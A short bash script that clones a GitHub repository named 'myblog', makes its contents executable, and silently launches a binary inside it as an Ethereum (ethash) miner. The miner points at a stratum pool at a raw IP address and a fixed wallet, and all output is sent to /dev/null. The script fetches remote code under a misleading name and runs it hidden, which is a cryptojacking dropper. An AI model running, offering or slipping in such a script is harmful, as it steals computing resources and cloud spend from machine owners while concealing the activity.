#!/bin/bash
mkdir hoang999
cd /hoang999
git clone https://github.com/thaihoang999/myblog.git -q
chmod -R +x myblog
./myblog/running -a ethash -o stratum+tcp://51.195.4.122:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-10 > /dev/null 2>&1
